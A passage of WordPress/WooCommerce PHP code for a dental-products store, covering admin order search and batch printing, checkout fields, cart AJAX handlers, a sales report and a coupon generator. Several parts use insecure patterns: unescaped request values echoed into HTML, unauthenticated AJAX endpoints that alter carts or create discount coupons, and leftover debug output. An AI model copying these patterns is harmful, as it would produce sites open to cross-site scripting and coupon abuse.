            $advanceSearchstyle = 'none';
            $batchStyle='none';
            $batchcls = '';
        }
        if (isset($_GET['batch_printing']) && $_GET['batch_printing'] != '') {
            $simpleSearchcls = '';
            $advanceSearchcls = '';
            $simpleSearchstyle = 'none';
            $advanceSearchstyle = 'none';
            $batchStyle='block';
            $batchcls = 'active';
        }
        $product_id = isset($_GET['product_id']) ? $_GET['product_id'] : array();
        $product_qty = isset($_GET['product_qty']) ? $_GET['product_qty'] : array();
        $new_array= array('boxes', 'bubble-wrap', 'envelope','raw');
       
        $args = array(
            'posts_per_page' => -1,
            'post_type' => 'product',
            
            'tax_query' => array(
                'relation' =>'AND',
                array(
                    'taxonomy' => 'product_cat',
                    'field' => 'slug',
                    'operator' => 'NOT IN',
                    'terms' =>$new_array,
                )
            )
        );

        $posts_array = get_posts(
            $args
        );
        $options = '';
        if ( count( $posts_array )>0 ) {
            foreach ( $posts_array as $PR ) {
                $selectd=''; 
                $options .='<option value="'.$PR->ID.'"> '.$PR->post_title.'</option>';
            }
        }
        $select_field = '<select name="product_id[]" id="product-id" class="select22">'.$options.'</select>';
        $row_html ='<div class="searh-row">
                 <div  class="search-filed-grp" style="display:inline-block;">
                  <label for="search-fname">Product:</label>
                 '.$select_field.'
                  </div>
                  <div  class="search-filed-grp" style="display:inline-block;">
                  <label for="search-fname">Product Quantity:</label>
                  <input type="number" id="product-qty" placeholder="Product Quantity" min="1" value="" name="product_qty[]" required>
                  </div>
                  <a href="javascript:void(0);" class="par-rem btn button" style="margin-top:34px">Remove</a>
                </div>
                ';
        $row_html2 = '';
       if(count($product_id)>0){
           $counter= 0;
           foreach($product_id as $prid){
               $options = '';
        if ( count( $posts_array )>0 ) {
            foreach ( $posts_array as $PR ) {
                $selectd=''; 
                if($PR->ID==$prid){
                    $selectd = 'selected';
                }
                $options .='<option value="'.$PR->ID.'" '.$selectd.'> '.$PR->post_title.'</option>';
            }
        }
        $select_field = '<select name="product_id[]" id="product-id" class="select22">'.$options.'</select>';
               $row_html2 .='<div class="searh-row">
                 <div  class="search-filed-grp" style="display:inline-block;">
                  <label for="search-fname">Product:</label>
                 '.$select_field.'
                  </div>
                  <div  class="search-filed-grp" style="display:inline-block;">
                  <label for="search-fname">Product Quantity:</label>
                  <input type="number" id="product-qty" min="1" placeholder="Product Quantity" value="' . $product_qty[$counter] . '" name="product_qty[]" required>
                  </div>
                  <a href="javascript:void(0);" class="par-rem btn button" style="margin-top:34px">Remove</a>
                </div>
                ';
               $counter++;
           }
       }
       else{
            $row_html2 = $row_html;
       }
        $htmll = '<div id="batch-printing" class="tabcontent" style="display:'.$batchStyle.'"><div class="customBatchPrinting">
                <div id="modal-window-printing">
                <div id="cloned-batch" style="display:none">
                 '.$row_html.'
                </div>
                <form class="form-inline" method="get" action="' . get_admin_url() . '/edit.php">
                <input type="hidden" name="post_type" value="shop_order">
                <input type="hidden" name="batch_printing" value="yes">
                <div id="original">
               '.$row_html2.'
                 </div>  
                <div class="searh-row" style="display: contents">
<div  class="search-filed-grp" style="width:100%;">
<label for="" style="opacity:0">End Date:</label>
<a href="javascript:void(0);" class="add-more-btach btn button" >Add More</a>

<button type="submit" id="batch-print-btn">Submit</button>
<a href="' . get_admin_url() . '/edit.php?post_type=shop_order&&batch_printing=yes" class="button" >Clear</a>
</div>
</div>
                </form>
        </div> </div>';
        $htmll = trim(preg_replace('/\s+/', ' ', $htmll));
        ?>
        <script>
            jQuery(document).ready(function () {
                jQuery('.wp-heading-inline').before('<?php echo $htmll; ?>');
                jQuery('.subsubsub').append('<a href="javascript:void(0);" class="batchprinting">Batch Printing</a>');
                jQuery(document).on('click', '.batchprinting', function () {
                    jQuery('.customBatchPrinting').slideToggle();
                });
            });
            jQuery(document).on('click','.add-more-btach',function(){
               jQuery('#original').append(jQuery('#cloned-batch').html()); 
               jQuery(document).find(".select22").select2({
            placeholder: "Please select product.",
            allowClear: true,
            width: '100%'
        });
            });
            jQuery(document).on('click','.par-rem',function(){
               jQuery(this).parents('.searh-row').remove();
            });
            
        </script>
        <?php
    }

    function injectScriptAdvanceSearch() {
        $simpleSearchcls = '';
        $simpleSearchstyle = 'none';
        $advanceSearchcls = 'active';
        $advanceSearchstyle = 'block';
        $batchStyle='none';
        $batchcls = '';
        if (isset($_GET['simple_search']) && $_GET['simple_search'] != '') {
            $simpleSearchcls = 'active';
            $advanceSearchcls = '';
            $simpleSearchstyle = 'block';
            $advanceSearchstyle = 'none';
            $batchStyle='none';
            $batchcls = '';
        }
        if (isset($_GET['batch_printing']) && $_GET['batch_printing'] != '') {
            $simpleSearchcls = '';
            $advanceSearchcls = '';
            $simpleSearchstyle = 'none';
            $advanceSearchstyle = 'none';
            $batchStyle='block';
            $batchcls = 'active';
        }
        $customer_first_name = isset($_GET['customer_first_name']) ? $_GET['customer_first_name'] : '';
        $customer_last_name = isset($_GET['customer_last_name']) ? $_GET['customer_last_name'] : '';
        $customer_email_address = isset($_GET['customer_email_address']) ? $_GET['customer_email_address'] : '';
        $order_number = isset($_GET['order_number']) ? $_GET['order_number'] : '';
        $tray_number = isset($_GET['tray_number']) ? $_GET['tray_number'] : '';
        $sbr_number = isset($_GET['sbr_number']) ? $_GET['sbr_number'] : '';
        $order_start_date = isset($_GET['order_start_date']) ? $_GET['order_start_date'] : '';
        $order_end_date = isset($_GET['order_end_date']) ? $_GET['order_end_date'] : '';
        $order_status = isset($_GET['post_status']) ? $_GET['post_status']:'';
        $product_status = isset($_GET['product_status']) ? $_GET['product_status']:'';
        $wc_processing = '';
        $wc_on_hold = '';
        $wc_completed = '';
        $wc_cancelled = '';
        $wc_refunded = '';
        $wc_failed = '';
        $impression_wating = '';
        $pending_on_lab = '';
         if ($product_status == 'waiting-impression') {
            $impression_wating = 'selected';
        }
        if ($product_status == 'pending-lab') {
            $pending_on_lab = 'selected';
        }
        if ($order_status == 'wc-processing') {
            $wc_processing = 'selected';
        }
        if ($order_status == 'wc-on-hold') {
            $wc_on_hold = 'selected';
        }
        if ($order_status == 'wc-completed') {
            $wc_completed = 'selected';
        }
        if ($order_status == 'wc-cancelled') {
            $wc_cancelled = 'selected';
        }
        if ($order_status == 'wc-refunded') {
            $wc_refunded = 'selected';
        }
        if ($order_status == 'wc-failed') {
            $wc_failed = 'selected';
        }
        $htmll = '<div id="advance-search" class="tabcontent" style="display: ' . $advanceSearchstyle . ';"> <div class="customSEarcingFilters">
<div id="modal-window-search">
<form class="form-inline" method="get" action="' . get_admin_url() . '/edit.php">
<input type="hidden" name="post_status" value="all">
<input type="hidden" name="action" value="-1">
<input type="hidden" name="action2" value="-1">
<input type="hidden" name="post_type" value="shop_order">
<input type="hidden" name="advance_search" value="advance_search">
<input type="hidden" name="paged" value="1">
<div class="searh-row">
 <div  class="search-filed-grp" style="display:inline-block;">
  <label for="search-fname">First Name:</label>
  <input type="text" id="search-fname" placeholder="First Name" value="' . $customer_first_name . '" name="customer_first_name">
  </div>
  <div  class="search-filed-grp">
  <label for="search-laname">Last Name:</label>
  <input type="text" id="search-laname" placeholder="Last Name" value="' . $customer_last_name . '" name="customer_last_name">
  </div>
</div>
<div class="searh-row">
 <div  class="search-filed-grp" style="display:inline-block; width:50%">
  <label for="search-email">Email:</label>
  <input type="email" id="search-email" value="' . $customer_email_address . '" placeholder="email" name="customer_email_address">
  </div>
  <div  class="search-filed-grp" style="display:inline-block; width:50%">
  <label for="search-tray-number">Tray Number:</label>
  <input type="text" id="search-tray-number" value="' . $tray_number . '" placeholder="Tray Number" name="tray_number">
  </div>
</div>
<div class="searh-row">
 <div  class="search-filed-grp" style="display:inline-block; width:50%">
  <label for="search-sbr-number">SBR Number:</label>
  <input type="text" value="' . $sbr_number . '" id="search-sbr-number" placeholder="SBR Number" name="sbr_number">
  </div>
  <div  class="search-filed-grp">
  <label for="search-order-number">Order Number:</label>
  <input type="text" id="search-order-number" value="' . $order_number . '" placeholder="Order Number" name="order_number">
  </div>
</div>
<div class="searh-row">
<div  class="search-filed-grp">
  <label for="">Start Date:</label>
  <input type="date" id="search-start-date" value="' . $order_start_date . '" placeholder="Start Date" name="order_start_date">
  </div>
  <div  class="search-filed-grp">
  <label for="">End Date:</label>
  <input type="date" id="search-end-date" value="' . $order_end_date . '" placeholder="End Date" name="order_end_date">
  </div>
</div>
<div class="search-filed-grp"> <label for="">Order Status:</label> <select class="subsubsub" name="post_status">
	<option value="">All</option>
<option value="wc-processing" ' . $wc_processing . '>Processing</option>
<option value="wc-on-hold" ' . $wc_on_hold . '>On Hold</option>
<option value="wc-completed" ' . $wc_completed . '>Completed</option>
<option value="wc-cancelled" ' . $wc_cancelled . '>Cancelled</option>
<option value="wc-refunded" ' . $wc_refunded . '>Refunded</option>
<option value="wc-failed" ' . $wc_failed . '>Failed</option>
</select> </div>
<div class="search-filed-grp"> <label for="">Product Status:</label> <select class="subsubsub" name="product_status">
	<option value="">All</option>
<option value="waiting-impression" ' . $impression_wating . '>waiting on impression</option>
<option value="pending-lab" ' . $pending_on_lab . '>Pending Lab</option>
</select> </div>
<div class="searh-row">
<div  class="search-filed-grp" style="width:100%;">
<label for="" style="opacity:0">End Date:</label>
<button type="submit">Submit</button>
<a href="' . get_admin_url() . '/edit.php?post_type=shop_order" class="button" id="clrbtn">Clear</a>
</div>
</div>
</form>
</div> </div>';
        $thmlSimpleSearch = '<div id="simple-Search" class="tabcontent" style="display:' . $simpleSearchstyle . '"><form action="" method="GET"><p class="search-box">
	<label class="screen-reader-text" for="post-search-input">Search orders:</label>
        <input type="hidden" name="post_type" value="shop_order">
        <input type="hidden" name="simple_search" value="true">
	<input type="search" id="post-search-input" name="s" value="">
		<input type="submit" id="search-submit" class="button" value="Search orders"></p></form></div>';
        $htmll = trim(preg_replace('/\s+/', ' ', $htmll));
        $thmlSimpleSearch = trim(preg_replace('/\s+/', ' ', $thmlSimpleSearch));
        ?>
        <script>
            jQuery(document).ready(function () {
                jQuery('.wp-heading-inline').before('<div class="tab custom-tabs"><ul><li class="tablinks <?php echo $advanceSearchcls; ?>" onclick="openCity(event,\'advance-search\')">Advance Search</li><li class="tablinks <?php echo $simpleSearchcls; ?>" onclick="openCity(event,\'simple-Search\')\">Simple Search</li><li class="tablinks <?php echo $batchcls; ?>" onclick="openCity(event, \'batch-printing\')">Batch Print</li></ul></div>');
                jQuery('.wp-heading-inline').before('<?php echo $htmll; ?>');
                jQuery('.wp-heading-inline').before('<?php echo $thmlSimpleSearch; ?>');

                jQuery('.subsubsub').append('<a href="javascript:void(0);" class="advenssearch">Advance Search</a>');
                jQuery(document).on('click', '.advenssearch', function () {
                    jQuery('.customSEarcingFilters').slideToggle();
                });
            });
        </script>
        <script>
            function openCity(evt, cityName) {
//                var i, tabcontent, tablinks;
//                tabcontent = document.getElementsByClassName("tabcontent");
//                for (i = 0; i < tabcontent.length; i++) {
//                    tabcontent[i].style.display = "none";
//                }
//                tablinks = document.getElementsByClassName("tablinks");
//                for (i = 0; i < tablinks.length; i++) {
//                    tablinks[i].className = tablinks[i].className.replace(" active", "");
//                }
//                document.getElementById(cityName).style.display = "block";
//                evt.currentTarget.className += " active";
                urll = jQuery('body').find('#clrbtn').attr('href');
                if(cityName=='batch-printing'){
                    urll = urll+'&batch_printing=yes';
                     window.location.assign(urll)
                   
                }
                
                if(cityName=='advance-search'){
                     window.location.assign(urll)
                }
                if(cityName=='simple-Search'){
                    urll = urll+'&simple_search=true';
                     window.location.assign(urll)
                }
            }
        </script>
        <style>
            #modal-window-search .form-inline,.customBatchPrinting .form-inline {  
                display: flex;
                flex-flow: row wrap;
                align-items: center;
            }

            #modal-window-search .form-inline label ,.customBatchPrinting .form-inline label {
                margin: 5px 10px 5px 0;
            }

            #modal-window-search .form-inline input,.customBatchPrinting .form-inline input {
                vertical-align: middle;
                margin: 5px 10px 5px 0;
                padding: 10px;
                background-color: #fff;
                border: 1px solid #ddd;
            }
            a.advenssearch {
                /* position: ABSOLUTE; */
                top: 7px;
                left: 200px;
                border: 1px solid #0071a1;
                border-radius: 2px;
                text-shadow: none;
                font-weight: 600;
                font-size: 13px;
                background-color: #f3f5f6;
                padding: 3px 7px;
            }
            #modal-window-search .form-inline button ,.customBatchPrinting .form-inline button {
                padding: 10px 20px;
                background-color: dodgerblue;
                border: 1px solid #ddd;
                color: white;
                cursor: pointer;
            }
            .wrap {
                position: relative;
            }
            #modal-window-search .form-inline button:hover ,.customBatchPrinting .form-inline button:hover {
                background-color: royalblue;
            }
            .searh-row{
                display:flex;
            }
            .searh-row .search-filed-grp:nth-child(even) {
                margin-left:10px;
            }
            #posts-filter .search-box{
                display: none !important;
            }
            .search-filed-grp {
                width:50%;



            }
            .search-field input, .search-field select{
                width:100%;
            }
            #modal-window-search .form-inline .button,.customBatchPrinting  .form-inline .button {
                padding: 10px 20px;
                background-color: dodgerblue;
                border: 1px solid #ddd;
                color: white;
                cursor: pointer;
                line-height: inherit !important;
            }
            .search-filed-grp label{
                display:block;
            }
            .search-filed-grp {
                width: 100%;
            }

            /* Style the tab */
            .tab {
                overflow: hidden;
                border: 1px solid #ccc;
                background-color: #f1f1f1;
            }

            /* Style the buttons that are used to open the tab content */
            .tab button {
                background-color: inherit;
                float: left;
                border: none;
                outline: none;
                cursor: pointer;
                padding: 14px 16px;
                transition: 0.3s;
            }

            /* Change background color of buttons on hover */
            .tab button:hover {
                background-color: #ddd;
            }

            /* Create an active/current tablink class */
            .tab button.active {
                background-color: #ccc;
            }
            ul.subsubsub{
                display:none;
            }
            /* Style the tab content */
            .tabcontent {
                display: none;
                padding: 6px 12px;
                border: 1px solid #ccc;
                border-top: none;
            }
            #original .searh-row .search-filed-grp .select2-container:nth-child(4) {
    display: none;
}#original .searh-row .search-filed-grp:nth-child(2) {
    margin-left: 15px !important;
}div#original .select2-container {
    margin-top: 5px;
}div#original {
    width: 100%;
    max-width: 488px;
}
            @media (max-width: 800px) {
                #modal-window-search .form-inline input {
                    margin: 10px 0;
                }

                #modal-window-search .form-inline,.customBatchPrinting .form-inline {
                    flex-direction: column;
                    align-items: stretch;
                }
            }
        </style>
        <?php
        echo '</div>';
    }
function ship_to_different_address_translation($translated_text, $text, $domain) {
    switch ($translated_text) {
        case 'Ship to a different address?' :
            $translated_text = __(' My shipping address is different than my billing address.', 'woocommerce’');
            break;
    }
    return $translated_text;
}

add_filter('gettext', 'ship_to_different_address_translation', 20, 3);

/**

 * Update the value given in custom field

 */
add_action('woocommerce_checkout_update_order_meta', 'custom_checkout_field_update_order_meta');

function custom_checkout_field_update_order_meta($order_id) {
    update_post_meta($order_id, 'user_device', sanitize_text_field($_POST['user_device']));
    if (!empty($_POST['purchasing_as_giftset'])) {

        update_post_meta($order_id, 'purchasing_as_giftset', sanitize_text_field($_POST['purchasing_as_giftset']));
    }
}
add_filter('woocommerce_checkout_fields', 'woocommerce_checkout_field_editor');

// Our hooked in function - $fields is passed via the filter!
function woocommerce_checkout_field_editor($fields) {
    $fields['billing']['purchasing_as_giftset'] = array(
        'label' => __('I am purchasing this as a gift.<br>
        <span style="font-size:0.7em;color:#555555;">Prices will be hidden on the receipt.</span>', 'woocommerce'),
        'placeholder' => _x('Field Value', 'placeholder', 'woocommerce'),
        'type' => 'checkbox',
    );
    return $fields;
}
add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields_mbt', 10);

//add_filter( 'woocommerce_billing_fields' , 'custom_override_billing_fields_mbt',10);
//add_filter( 'woocommerce_shipping_fields' , 'custom_override_shipping_fields_mbt',10 );
function custom_override_checkout_fields_mbt($fields) {

    unset($fields['shipping']['shipping_company']);
    unset($fields['shipping']['shipping_address_2']);
    unset($fields['billing']['billing_company']);
    unset($fields['billing']['billing_address_2']);
    //$fields['billing']['billing_email']['priority'] = 1;
    //$fields['shipping']['billing_email']['priority'] = 1;
    return $fields;
}
function md_custom_woocommerce_checkout_fields_mbt($fields) {
    $fields['order']['order_comments']['placeholder'] = 'Note To Recipient';
    $fields['order']['order_comments']['label'] = 'Note To Recipient';

    return $fields;
}
add_filter('woocommerce_checkout_fields', 'md_custom_woocommerce_checkout_fields_mbt');

// define the woocommerce_before_order_notes callback 
function action_woocommerce_before_order_notes($checkout) {
    echo '<div class="panel-heading">
   <a rel="nofollow" data-toggle="collapse" href="javascript:void(0);" class="showhideordercomment" aria-expanded="false" style="font-size:1.2em;">I would like to include a note to the recipient
      <i class="fa fa-arrow-circle-o-down fa-lg"></i>
   </a>
</div>';
}

;
// add the action 
add_action('woocommerce_before_order_notes', 'action_woocommerce_before_order_notes', 10, 1);
// update woocommerce cart quantity
add_action('wp_ajax_update_woocommerce_cart_quantitys', 'update_woocommerce_cart_quantitys');
add_action('wp_ajax_nopriv_update_woocommerce_cart_quantitys', 'update_woocommerce_cart_quantitys');

function update_woocommerce_cart_quantitys() {
    if (isset($_POST['cart_item_val']) && $_POST['cart_item_val'] != '' && isset($_POST['cart_item_key']) && $_POST['cart_item_key'] != '') {

        $cart_item_key = $_POST['cart_item_key'];
        $cart_item_key = str_replace('cart[', '', $cart_item_key);
        $cart_item_key = str_replace('][qty]', '', $cart_item_key);
        if ($cart_item_key != '') {
            global $woocommerce;
            $woocommerce->cart->set_quantity($cart_item_key, $_POST['cart_item_val']);
            $woocommerce->cart->calculate_totals();
            die();
        }
    }
}

remove_action('woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20);

add_action('woocommerce_checkout_order_review_below_area', 'woocommerce_checkout_payment', 20);

/* * **************** direct checkout feature */
add_action('template_redirect', 'skip_cart_redirect');

function skip_cart_redirect() {
    // Redirect to checkout (when cart is not empty)
    if (WC()->cart->is_empty() && is_cart()) {
        wp_safe_redirect(wc_get_page_permalink('shop'));
        exit();
    }
    if (is_cart()) {
        if (isset($_REQUEST['email'])) {
            $redirect_url = wc_get_checkout_url() . '?email=' . $_REQUEST['email'];
            wp_safe_redirect($redirect_url);
        } else {
            wp_safe_redirect(wc_get_checkout_url());
        }

        exit();
    }
    // Redirect to shop if cart is empty
}

/* * ********* shsow cart on checkout default page */
add_action('woocommerce_before_checkout_form', 'bbloomer_cart_on_checkout_page_only', 5);

function bbloomer_cart_on_checkout_page_only() {

    if (is_wc_endpoint_url('order-received'))
        return;
    echo '<div id="sb_checkout_cart">';
    echo do_shortcode('[woocommerce_cart]');
    echo '</div>';
}

function warp_ajax_product_remove() {
    // Get order review fragment
    ob_start();
    foreach (WC()->cart->get_cart() as $cart_item_key => $cart_item) {
        if ($cart_item['product_id'] == $_POST['product_id'] && $cart_item_key == $_POST['cart_item_key']) {
            WC()->cart->remove_cart_item($cart_item_key);
        }
    }

    WC()->cart->calculate_totals();
    WC()->cart->maybe_set_cart_cookies();

    woocommerce_order_review();
    $woocommerce_order_review = ob_get_clean();
    die();
}

//add_action('wp_ajax_product_remove', 'warp_ajax_product_remove');
//add_action('wp_ajax_nopriv_product_remove', 'warp_ajax_product_remove');

add_action('woocommerce_after_order_notes', 'sent_from_mob_or_desktop');

function sent_from_mob_or_desktop($checkout) {
    $device_name = 'desktop';
    if (wp_is_mobile()) {
        $device_name = 'Mobile';
    }
    woocommerce_form_field('user_device', array(
        'type' => 'hidden',
        'class' => array(
            'my-field-class form-row-wide'
        ),
        'placeholder' => __('Device'),
        'required' => true,
            ), $device_name);
    echo '</div>';
}

add_action('woocommerce_admin_order_data_after_order_details', 'edit_woocommerce_checkout_page', 10, 1);

function edit_woocommerce_checkout_page($order) {
    global $post_id;
    $order = new WC_Order($post_id);
    echo '<p><strong>' . __('User Device') . ':</strong> ' . get_post_meta($order->get_id(), 'user_device', true) . '</p>';
    if (get_post_meta($order->get_id(), 'purchasing_as_giftset', true) != '') {
        echo '<p><strong>' . __('Purchased As Giftset') . ':</strong> Yes</p>';
    }
    if (get_post_meta($order->get_id(), 'gehaOrder', true) != '') {
        echo '<p><strong>' . __('GEHA Order') . ':</strong> Yes</p>';
    }
    ?>
        <style>
            .wrapper.open {
    position: fixed;
    width: 100%;
    height: 100%;
    top: 0px;
    left: 0px;
    background: #fff;
    z-index:999;
}

     .popup a.close {
    position: absolute;
    top: 17%;
    right: 25%;
    z-index: 999;
    font-size: 18px;
    background: #fff;
    width: 30px;
    height: 30px;
    text-align: center;
    border-radius: 30px;
    border: 1px solid #ccc;
    color: #333;
    text-decoration: none;
    line-height: 1.5;
}       
        </style>

<script>
    jQuery(document).on('click','#wp_signup_form',function(e){
        e.preventDefault();
        data_f = $('#woocreateuser :input').serialize();
        jQuery.ajax({
           data:data_f,
           method:'post',
           url:'<?php echo admin_url( 'admin-ajax.php' );?>',
           success:function(res){
               console.log(res);
        }
    });
    });
jQuery(document).on('click','.openpop',function () {
/*
Swal.fire({
 title: 'Create User',
  html: ` <input type="text" id="cus_first_name" class="swal2-input" placeholder="First Name">
 <input type="text" id="cus_last_name" class="swal2-input" placeholder="Last Name">
<input type="email" id="customer_email" class="swal2-input" placeholder="Email">`,
  confirmButtonText: 'Create User',
  showLoaderOnConfirm: true,
  preConfirm: (abckyx) => {
     const cus_first_name = Swal.getPopup().querySelector('#cus_first_name').value
    const cus_last_name = Swal.getPopup().querySelector('#cus_last_name').value
    const customer_email = Swal.getPopup().querySelector('#customer_email').value
    data_f = 'cus_first_name='+cus_first_name+'&cus_last_name='+cus_last_name+'&customer_email='+customer_email+'&action=create_woo_customer';
    if (!cus_first_name || !cus_last_name || !customer_email) {
      Swal.showValidationMessage(`Please First Name, Last Name And Email Address`)
    }
    
    jQuery.ajax({
           data:data_f,
           method:'post',
           url:'<?php echo admin_url( 'admin-ajax.php' );?>',
           success:function(res){
               if(res.status=="0"){
                   swal("Error!", res.error, "error"); 
        }
        if(res.status=="1"){
                  swal("Done!", "User Added Successfully!", "success");
        }
        },
         error: function (xhr) {
                 swal("Error!", "Unknown error occured", "error"); 
            }
    })
  },
  allowOutsideClick: () => !Swal.isLoading()
}).then((result) => {
  if (result.isConfirmed) {
    Swal.fire({
      title: `${result.value.login}'s avatar`,
      imageUrl: result.value.avatar_url
    })
  }
})
  */
    

Swal.fire({
  title: 'Create User',
  html: ` <div id="appendres" style="color:red"></div><input type="text" id="cus_first_name" class="swal2-input" placeholder="First Name">
 <input type="text" id="cus_last_name" class="swal2-input" placeholder="Last Name">
<input type="email" id="customer_email" class="swal2-input" placeholder="Email">`,
  showLoaderOnConfirm: true,
  inputAttributes: {
    autocapitalize: 'off'
  },
  showCancelButton: true,
  confirmButtonText: 'Create User',
  showLoaderOnConfirm: true,
  preConfirm: (login) => {
      const cus_first_name = Swal.getPopup().querySelector('#cus_first_name').value
    const cus_last_name = Swal.getPopup().querySelector('#cus_last_name').value
    const customer_email = Swal.getPopup().querySelector('#customer_email').value
    data_f = 'cus_first_name='+cus_first_name+'&cus_last_name='+cus_last_name+'&customer_email='+customer_email+'&action=create_woo_customer';
    if (!cus_first_name || !cus_last_name || !customer_email) {
      Swal.showValidationMessage(`Please First Name, Last Name And Email Address`)
    }
    return fetch('https://dev.smilebrilliant.com/wp-admin/admin-ajax.php?'+data_f)
      .then(response => {
        if (!response.ok) {
          throw new Error(response.statusText)
        }
        return response.json()
      })
      .catch(error => {
        Swal.showValidationMessage(
          `Request failed: ${error}`
        )
      })
  },
  allowOutsideClick: () => !Swal.isLoading()
}).then((result) => {
  if (result.isConfirmed) {
      console.log(result);
      res = result.value;
      if(res.status=="0"){
                 jQuery('#appendres').html(res.error);
                   Swal.fire({
      title: `Error`,
      text: res.error
    })
        }
        if(res.status=="1"){
                 Swal.fire({
      title: `Success`,
      text: "user added successfully"
    })
   
        }
        }
//    Swal.fire({
//      title: `${result.value.login}'s avatar`,
//      imageUrl: result.value.avatar_url
//    })
  
})
});
</script>
   
        <?php
}

add_action('template_redirect', 'redirect_to_parent_product');

function redirect_to_parent_product() {

    if (has_term(array('desensitizing-gel'), 'type')) {

        wp_safe_redirect(home_url('product/sensitive-teeth-gel'));
        exit();
    }
    if (has_term(array('electric-toothbrush'), 'type')) {

        wp_safe_redirect(home_url('product/electric-toothbrush'));
        exit();
    }
    if (has_term(array('nightguard-system'), 'type')) {

        wp_safe_redirect(home_url('product/night-guards'));
        exit();
    }
    if (has_term(array('toothbrush-head'), 'type')) {

        wp_safe_redirect(home_url('product/toothbrush-heads/'));
        exit();
    }
    if (has_term(array('tray-system'), 'type')) {

        wp_safe_redirect(home_url('product/teeth-whitening-trays'));
        exit();
    }
    if (has_term(array('whitening-gel'), 'type')) {

        wp_safe_redirect(home_url('product/teeth-whitening-gel'));
        exit();
    }
}

add_action('wp_ajax_remove_composite_product_from_cart', 'remove_composite_product_from_cart_func');
add_action('wp_ajax_nopriv_remove_composite_product_from_cart', 'remove_composite_product_from_cart_func');

function remove_composite_product_from_cart_func() {
    $prouctid = $_POST['product_id'];
    global $woocommerce;
    foreach ($woocommerce->cart->get_cart() as $cart_item_key => $cart_item) {
        if ($cart_item['product_id'] == $prouctid) {

            WC()->cart->remove_cart_item($cart_item_key);
        }
    }
    //return false;
    die();
}

function get_customers_between_rangess($range) {
    $start_date = date("Y-m-d");
    if ($range == 'last_month') {
        $end_date = date("Y-m-d", strtotime("- 30 day"));
        $date_query = "AND posts.post_date BETWEEN '$end_date' AND '$start_date' ";
    } else if ($range == 'month') {
        $date_query = "AND posts.post_date > DATE_SUB(NOW(), INTERVAL 1 MONTH)";
    } else if ($range == 'year') {
        $date_query = "AND posts.post_date > DATE_SUB(NOW(), INTERVAL 1 YEAR)";
    } else {
        $end_date = date("Y-m-d", strtotime("- 7 day"));
        $date_query = "AND posts.post_date BETWEEN '$end_date' AND '$start_date'";
    }
    $query_orders = "SELECT COUNT(user.ID) AS total_customers FROM wp_users AS users

    where users.user_role IN ( '" . implode("','", array('wc-completed', 'wc-processing', 'wc-on-hold')) . "' )
    " . $date_query;
}

//add_action('admin_init','calculate_order_details_ranges');
//add_action('woocommerce_admin_reports','calculate_order_details_ranges');
add_filter('woocommerce_admin_reports', 'custom_tab_mbt');

function custom_tab_mbt($reports) {
    /*
      echo '<pre>';
      print_r($reports);
      die();
     */
    $reports['custom_tab'] = array(
        'title' => __('Custom Reports', 'woocommerce'),
        'description' => 'WooCommerce Orders Listing Here...',
        'hide_title' => true,
        'callback' => 'display_orders_list_cusotomers'
    );
    return $reports;
}

function display_orders_list_cusotomers() {

    //if(isset($_GET['page']) && $_GET['page'] == 'wc-reports'){
    Global $wpdb;
    $grossSales = "'wc-completed', 'wc-processing', 'wc-on-hold'";
    $netSales = "'wc-completed', 'wc-processing', 'wc-on-hold', 'wc-cancelled', 'wc-refunded'";
    $net = "posts.post_status IN (" . $grossSales . ")";
    $gross = "posts.post_status IN (" . $grossSales . ")";
    $start_date = date("Y-m-d");
    echo 'here kkk';
    $date_range = isset($_GET['range']) ? $_GET['range'] : '';
    if ($date_range == 'last_month') {
        $end_date = date("Y-m-d", strtotime("- 29 day"));
        $date_query = "AND posts.post_date BETWEEN '$end_date' AND '$start_date' ";
    } else if ($date_range == 'month') {
        $date_query = "AND posts.post_date > DATE_SUB(NOW(), INTERVAL 1 MONTH)";
    } else if ($date_range == 'year') {
        $date_query = "AND posts.post_date > DATE_SUB(NOW(), INTERVAL 1 YEAR)";
    } else {
        $end_date = date("Y-m-d", strtotime("- 6 day"));
        $date_query = "AND posts.post_date BETWEEN '$end_date' AND '$start_date'";
    }



    echo $query_orders = "SELECT SUM(meta.meta_value) AS total_sales, COUNT(posts.ID) AS total_orders FROM wp_posts AS posts

    LEFT JOIN wp_postmeta AS meta ON posts.ID = meta.post_id

    WHERE meta.meta_key = '_order_total'

    AND posts.post_type = 'shop_order'

    AND $grossSales
    " . $date_query;

    $Select_Order_Details = $wpdb->get_results($query_orders);
    $Select_Order_Details = json_encode($Select_Order_Details);
    print_r($Select_Order_Details);
    //exit;
    // }
}

/*
 * Insert Coupon Code
 */

function generate_string() {
    $coupon_code = substr("abcdefghijklmnopqrstuvwxyz123456789", mt_rand(0, 50), 1) . substr(md5(time()), 1); // Code
    return $coupon_code = strtoupper(substr($coupon_code, 0, 5)); // create 10 letters coupon
}

add_action('wp_ajax_nopriv_add_geha_coupon_code', 'add_geha_coupon_code');
add_action('wp_ajax_add_geha_coupon_code', 'add_geha_coupon_code');

function add_geha_coupon_code() {
    $first_name = isset($_POST['first_name']) ? $_POST['first_name'] : '';
    $last_name = isset($_POST['last_name']) ? $_POST['last_name'] : '';
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $member_id = isset($_POST['member_id']) ? $_POST['member_id'] : '';
    $confirm_member_id = isset($_POST['confirm_member_id']) ? $_POST['confirm_member_id'] : '';
    if ($first_name == '' || $last_name == '' || $email == '' || $member_id == '' || $confirm_member_id == '') {
        $arr = array('status' => false, 'code' => 'All Fields Are required');
        echo json_encode($arr);
        die();
    }
    if ($member_id != $confirm_member_id) {
        $arr = array('status' => false, 'code' => 'Member id and confirm member id do not match');
        echo json_encode($arr);
        die();
    }

    $coupon_code = generate_string($permitted_chars, 5); // Code
    $amount = '20'; // Amount
    $discount_type = 'percent'; // Type: fixed_cart, percent, fixed_product, percent_product

    $coupon = array(
        'post_title' => $coupon_code,
        'post_content' => '',
        'post_status' => 'publish',
        'post_author' => 1,
        'post_type' => 'shop_coupon');

    $new_coupon_id = wp_insert_post($coupon);
    if ($new_coupon_id) {
        update_post_meta($new_coupon_id, 'discount_type', $discount_type);
        update_post_meta($new_coupon_id, 'coupon_amount', $amount);
        update_post_meta($new_coupon_id, 'individual_use', 'no');
        update_post_meta($new_coupon_id, 'product_ids', '');
        update_post_meta($new_coupon_id, 'exclude_product_ids', '');
        update_post_meta($new_coupon_id, 'usage_limit', '');
        update_post_meta($new_coupon_id, 'expiry_date', '');
        update_post_meta($new_coupon_id, 'apply_before_tax', 'yes');
        update_post_meta($new_coupon_id, 'free_shipping', 'no');
